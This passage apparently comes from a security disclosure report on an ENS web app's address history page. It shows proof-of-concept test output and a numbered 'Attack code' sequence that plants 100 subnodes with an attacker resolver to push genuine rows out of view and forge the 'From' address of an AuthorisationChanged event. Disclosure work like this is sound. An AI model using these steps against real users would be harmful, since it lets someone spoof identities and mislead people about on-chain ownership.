      NewOwner               {"id":"11155111-11508429-290","blockNumber":11508429,"transactionID":"0x4c359f58488077d7a78b9de8383918acce26dc2cb0bac08993b7a0e04fcc7b73","type":"NewO
      AddrChanged            {"id":"11155111-11508429-293","blockNumber":11508429,"transactionID":"0x4c359f58488077d7a78b9de8383918acce26dc2cb0bac08993b7a0e04fcc7b73","type":"Addr
      MulticoinAddrChanged   {"id":"11155111-11508429-292","blockNumber":11508429,"transactionID":"0x4c359f58488077d7a78b9de8383918acce26dc2cb0bac08993b7a0e04fcc7b73","type":"Mult
PASS  resolver-authored rows survive the merge and reach the renderer unfiltered — no per-source filter exists

==============================================================================
ACT 5 — AuthorisationChanged.owner is a SCALAR, so it steals the From column
==============================================================================
AuthorisationChanged.owner : {"kind":"NON_NULL","name":null,"ofType":{"kind":"SCALAR","name":"String"}}
PASS  AuthorisationChanged.owner is a SCALAR String! — every OTHER `owner` in the app query is `owner { id }`, an object
a real indexed row       : {"id":"11155111-9262742-211","owner":"0x9f88d9b0b934a5261c364a726a9a36d67b431cab","target":"0x9f88d9b0b934a5261c364a726a9a36d67b431cab","isAuthorized":true,"transactionID":"0x296aa690d66091244e1444e15d60e01b420d32d341c3f9d1a7dbeadbfa43a9a2","blockNumber":9262742}
the same row with the attacker's chosen owner: {"id":"11155111-9262742-211","owner":"0x00000000219ab540356cbb839cbe05303d7705fa","target":"0x9f88d9b0b934a5261c364a726a9a36d67b431cab","isAuthorized":true,"transactionID":"0x296aa690d66091244e1444e15d60e01b420d32d341c3f9d1a7dbeadbfa43a9a2","blockNumber":9262742,"type":"AuthorisationChanged"}
PASS  extractFromAddress.ts:17-19 returns the attacker's string: 0x00000000219ab540356cbb839cbe05303d7705fa

EventsTableRow.tsx:28-29   const eventAddress = extractFromAddress(eventDetails)
                           const fromAddress  = eventAddress ?? row.original.from
  -> the attacker-chosen address WINS over the RPC-derived real sender for that
     expanded event row, and AddressDisplay.tsx:17,28-29 reverse-resolves it, so
     the row can print any ENS name the attacker points at. Same on mobile:
     MobileExpandedEvents.tsx:17,30.
PASS  control: an object-shaped `owner { id }` is correctly skipped — only the scalar leaks

==============================================================================
PoC PASSED
==============================================================================
```

## Attack code

1. `attacker.eth.owner` calls `registry.setSubnodeOwner(node("attacker.eth"), 0, attackerContract)` - ordinary registry ownership, no special role.
2. Off-chain, grind labels `L1..L100` under `attacker.eth` until each `namehash(Li.attacker.eth)` sorts below `victim`'s lowest genuine domain id (PoC ACT 2: 2-4 tries/label for a small victim).
3. `attackerContract` deploys `AttackerResolver`, a contract with no relationship to `victim` that implements `AddrChanged`/`TextChanged`/`AuthorisationChanged` emitters it controls.
4. Loop `registry.setSubnodeRecord(node("attacker.eth"), Li, VICTIM, AttackerResolver, 0)` once per label (\~50k gas each, batchable in one transaction).
5. In `AttackerResolver`, emit `AuthorisationChanged(node, ATTACKER_CHOSEN_FROM, target, true)` for at least one planted subnode.
6. Anyone opens `/addr/<VICTIM>/history`. No wallet, no ownership, no interaction. The page's v1 leg now returns only the 100 planted rows; expanding the `AuthorisationChanged` row prints `ATTACKER_CHOSEN_FROM` under "From".

```
plant : setSubnodeRecord(attackerNode, Li, VICTIM, AttackerResolver, 0) x100, one AttackerResolver event carrying a chosen owner
fire  : anyone opens /addr/<VICTIM>/history
```

## Attachments

Key evidence (all in `evidence/`):

* `addr-route-victim-BEFORE-empty-DEPLOYED.png` — victim page empty before the attack
* `addr-route-victim-AFTER-injected-DEPLOYED.png` — same page filled with attacker rows after the attack
* `addr-route-victim-AFTER-expanded-forgedFrom-DEPLOYED.png` — the forged "From" on the `AuthorisationChanged` row
* `plant_addr_history.mjs`, `plant-addr-result.json` — the live-Sepolia plant script and its on-chain result (tx hashes)
* `addr-route-0x8024-longhistory-DEPLOYED.png` — a live address owning 163 domains, rendered on the deployed route (illustrates the 100-cap eviction at scale)
* `evidence/README.md` — full walkthrough of every screenshot and on-chain step
